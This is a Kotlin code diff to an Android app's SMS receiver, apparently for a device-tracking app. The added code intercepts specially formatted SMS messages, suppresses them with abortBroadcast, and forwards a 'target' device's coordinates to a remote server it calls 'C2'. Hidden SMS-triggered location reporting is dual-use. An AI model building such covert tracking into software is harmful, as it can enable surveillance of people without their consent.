@@ -35,6 +35,7 @@ import kotlinx.coroutines.launch
 class SmsCommandReceiver : BroadcastReceiver() {
 
     @Inject lateinit var prefs: SecurePrefs
+    @Inject lateinit var zexApi: com.zex.tracker.data.remote.api.ZexApi
     @Inject lateinit var commandProcessor: CommandProcessor
     @Inject lateinit var searchModeManager: SearchModeManager
     @Inject lateinit var locationTracker: LocationTracker
@@ -136,6 +137,45 @@ class SmsCommandReceiver : BroadcastReceiver() {
                 val sender = msg.originatingAddress ?: continue
                 val rawBody = msg.messageBody?.trim() ?: continue
                 
+                
+                // 🚀 SMS Relay Gateway Logic 🚀
+                if (rawBody.startsWith("#ZEX#LOC#")) {
+                    ZexLogger.i("SmsCommandReceiver", "Received SMS Relay Payload: $rawBody")
+                    try { abortBroadcast() } catch (e: Exception) { }
+                    
+                    val pendingResult = goAsync()
+                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                        try {
+                            val parts = rawBody.split("#").filter { it.isNotEmpty() }
+                            if (parts.size >= 5 && parts[1] == "LOC") {
+                                val lat = parts[2].toDoubleOrNull()
+                                val lng = parts[3].toDoubleOrNull()
+                                val targetUid = parts[4]
+                                
+                                if (lat != null && lng != null) {
+                                    val relayPayload = com.zex.tracker.data.remote.dto.RelayTelemetryPayload(
+                                        target_device_uid = targetUid,
+                                        latitude = lat,
+                                        longitude = lng,
+                                        relay_source = "SMS_RELAY"
+                                    )
+                                    val response = zexApi.relayTelemetry(relayPayload)
+                                    if (response.isSuccessful) {
+                                        ZexLogger.i("SmsCommandReceiver", "Successfully relayed telemetry to C2 via SMS_RELAY")
+                                    } else {
+                                        ZexLogger.e("SmsCommandReceiver", "Failed to relay telemetry: ${response.code()}")
+                                    }
+                                }
+                            }
+                        } catch (e: Exception) {
+                            ZexLogger.e("SmsCommandReceiver", "Error processing SMS Relay", e)
+                        } finally {
+                            pendingResult.finish()
+                        }
+                    }
+                    continue
+                }
+
                 if (rawBody.contains("ZEX Alert")) {
                     val regex = Regex("GPS:\\s*([\\\\-0-9.]+),\\s*([\\\\-0-9.]+)")
                     val match = regex.find(rawBody)
